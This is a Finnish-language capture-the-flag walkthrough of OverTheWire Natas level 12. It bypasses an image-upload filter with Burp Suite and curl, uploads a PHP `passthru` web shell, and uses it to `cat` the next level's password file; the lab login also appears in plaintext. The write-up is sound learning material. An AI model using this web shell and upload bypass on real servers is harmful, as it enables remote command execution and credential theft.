# LEVEL 12 - START HERE

natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

Perus ekana tarkistellaan, mitä tässä on koodattukaan 

![alt text](./kuvat-level11-15/natas12-0.png)

Jotenkin tässä harjoituksessa huomataan PHP-koodikielestä että **JPEG** - kuva tiedosto maksimi on 1KB (MAX_FILE_SIZE).

![alt text](./kuvat-level11-15/natas12-1.png)

Periaatteessa upotin jonkun satunnaisen kuvatiedoston ja testiä ainakin toimii siis et tuli _"There was an error uploading the file, please try again!"_  - mut tämä tapahtuu toisessa uudessa sivuston alla kun jos tulee _error_ ja polku */index.php*. 

![alt text](./kuvat-level11-15/natas12-3.png)

![alt text](./kuvat-level11-15/natas12-4.png)

## Level 12 - 2 - some testing 
**Virallinen testi ja selvitettään level 12 salasansa** <br>
Perus selvittämistä ja etsitään netistä lisää ohjeita ja lisätietoa, mutta siellä on jotakin testejä että upottaa PHP-koodikielisen scriptin. Rakensin simppelin PHP koodikielen pikaisesti joku **Hello world** Kali Linux:seen , `testi1.php`. Huomioina ennen kuin upottaa ton PHP-scriptin testin sinne Natas12 harjoitukseen, niin avaa ohjelmisto työkalu kuin **Burp Suite**. Tämän ohjelma tarjoaa Kali Linux ohjelman alustalla, ja sen versio on suht kattava ettei tarvitse olla mitään _pro / subscribe_ versiot

**Burp Suite**:ssa riittää avaa _History_ välilehden ja seuraa sieltä tarkasti sivussa, kun on upottanut PHP-koodi scriptin Natas 12 levelin alle. Ei ole pakko olla PHP-koodia , että uskon varmasti perus "Hi" tai jotakin tekstiä/sanaa voi syöttää ja ideana se liitteen tiedoston perässä on nimetty **.php**.

```
<?php

echo "Hello World!";

?>

```

![alt text](./kuvat-level11-15/natas12-5.png)

(kuvasta jouduin ottaa uuden screenshotin) siksi verrattuna proxy seurannasta näyttää eri numerolta/tiedoston nimeämiseltä)
![alt text](./kuvat-level11-15/natas12-5.1.png)

Tässä se historiasta näkeekin, mitä aikaisemmassa (ylempi kuvassa), kun upotin ton **testi.php** koodi pätkän ja meni varmasti sinne palvelimen polkuun ja vähä kuin lukaisee sitä scipritä/koodin sisältöä (Burp suitessa). Upotetun jälkeen *testi.php* tiedosto piti tulla, mutta miksi yhtäkkiä antoi jotakin satunnaista nimeämistä */upload/t29....jpg* kuva tiedostoa? 

**Proxy** seurannasta näkee mitä upotin ja tässä alettaan suorittaa seuraavaa pientä operaatio.

![alt text](./kuvat-level11-15/natas12-6.1.png)

Eli seuraavaksi muutettaan tuosta **Proxy** --> *Intercept* - välilehden alta, että muutettaan toi kuvatiedosto (alhaalla oleva nuolenpäästä) muutettuna *jpg* --> *php* tiedostoksi ja sitten vaan **Forward**. Tämä (Forward) tarkoittaa silloin sitä, että kun pyyntö on siepattu, hakkeri/testaaja voi päättää lähetetäänkö se eteenpäin palvelimelle — eli antaa HTTP pyynnön jatkaa eteenpäin.

![alt text](./kuvat-level11-15/natas12-7.png)

HTTP pyynnöstä lähetettyn jälkeen kannattaa päivittää tämä sivusto normi päivitä sivusto niin huomattua se on muuttunut.

![alt text](./kuvat-level11-15/natas12-8.png)

Tämän jälkeen kaksois klikkaa sitä tiedostoa (ylemmän kuvan) mukaista liitettä niin avattuna niin se kertoo tämän **testi.php** skripti/koodi sisällön ja se on _Hello World!_ .

![alt text](./kuvat-level11-15/natas12-9.png)


## Level 12 - 3 - find the password

Nyt tässä kappaleessa alettaan selvittää sitä seuraavan level 13 salasansa ja tässä harjoituksessa tapahtui/tapahtui kaltainen tyyppinen kuin etsitään sitä hakemiston polkua eli **/etc/natas_webpass/natasX** . 


Seuraavaksi loin tällaiset HTTP GET skriptin PHP-koodikielellä ja riittää tekstiin sisälle voi olla jotakin, mutta parhaimmillaan että itse tietää ja mahdollisimman lyhyeksi.
 <br>
`<?php passthru($_GET['Vastaus']); ?>` <br> - Sitten upotetun jälkeen normi "Upload file" ja sen jälkeen huomaa tiedosto on upotettu palvelimeen ja muutettu kuvaksi. 

![alt text](./kuvat-level11-15/natas12-10.png)

![alt text](./kuvat-level11-15/natas12-11.png)


Samanaikaisesti kun tarkistaa **Burp Suite** ohjelman HTTP historiasta että näkee sen saman upotettun tiedoston nimensä (**testi2.php**) ja kuvan tiedoston nimi.

![alt text](./kuvat-level11-15/natas12-12.png)

Tämä on sama kuin ylempi kuva, mutta oikealle lisäsin ton firefox selaimen, että varmistettaan on tosi id.
![alt text](./kuvat-level11-15/natas12-13.png)

**Seuraavaksi**;
Varmistettaan toi "intercept" on otettu ja kaapattu tämä natas 12 level sivuston tietoja, koskevien tuota upotettu *.php* koodia palvelimelle.

![alt text](./kuvat-level11-15/natas12-14.png)


Sitten vaan muuttaa ton **.jpg** kuvan tiedoston **.php**:ksi, ja klikkauksesta **Forward** - niin tämä Burp suite ohjelma lähettää sen HTTP pyynnön sinne Firefox selaimeen.

![alt text](./kuvat-level11-15/natas12-15.png)


Vastaan otettu Burp Suite ohjelman Forward - HTTP pyyntö (ylemän kuvan toiminnasta) ja tänne muuttuu se *.php* tiedosto. 

![alt text](./kuvat-level11-15/natas12-16.png)

Muista välissä sulkea toi **intercept** , koska jos jatkuvasti seurataan pelkkää tätä linkkiä niin ei toimi ja muutettun jälkeen

![alt text](./kuvat-level11-15/natas12-17.png)

Tämä on jotakin tarkistusta, mutta varmuuden vuoksi otin screenshotin.

![alt text](./kuvat-level11-15/natas12-18.png)

Nyt alemmassa kuvassa huomioina toi **URL** kentässä näkyy lisäsin perään *Vastaus=ls* - koska oma testi tiedoston koodi pätkässsä on se **"Vastaus"** sana ja katsotaan löytääkö sen mistään skriptien ja muualta hakemiston alta. Tuloksena antoi jotakin loorem ipsum hebreeta dataa.

```
http://natas12.natas.labs.overthewire.org/upload/am34u6tos4.php?Vastaus=ls
ls (linux komento $ls)
```

![alt text](./kuvat-level11-15/natas12-19.png)


**Seuraavaksi**: <br>
testataan hakemiston tiedoston URL kuin **=cat /etc/natas_webpass/natas13** - ja tätä sijoittuu sinne URL peräänsä siksi lukee näin:

`http://natas12.natas.labs.overthewire.org/upload/am34u6tos4.php?Vastaus=cat%20/etc/natas_webpass/natas13`
<br><br>

Näin _voila_ saattiin tämän seuraavan level 13 salasansa.

![alt text](./kuvat-level11-15/natas12-20.png)

---

## Level 12 - 3 - Kali Linux steppi START HERE;

Tämä on vain sivullinen Kali linux versio, että vähä kuin mentäisiin käyttöliittymän ja selaimen version kautta, ja aina harjoituksen toinen vaihtoehtoinen valinta.

- `curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"`

Normi check tarkistus sivuston alta. 
```
┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="7fg1oxl9me.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Upotettaan välittömästi joku PHP-koodi pätkästä tyyppinen suoraan curl komentoon ja tämä joku shell-php koodi pätkä komento pohja: `<?php echo keitto ?>` <br><br>

Testausta ja upotettaan kuva tiedosto
```
┌──(kali㉿kali)-[~]
└─$ echo "<?php echo keitto ?>" > image.php                            

┌──(kali㉿kali)-[~]
└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```










## Level 12 - 4 - vinkkejä ja ohjeita:

https://samxia99.medium.com/overthewire-updated-natas-walkthrough-level-12-0688ea43ef92 <br>

https://nils-maeurer.de/post/overthewire-natas12-13/ <br>

https://learnhacking.io/overthewire-natas-level-12-walkthrough/ <br>

https://medium.com/@enesaladag/overthewires-natas12-3c6e7ce72900 <br>

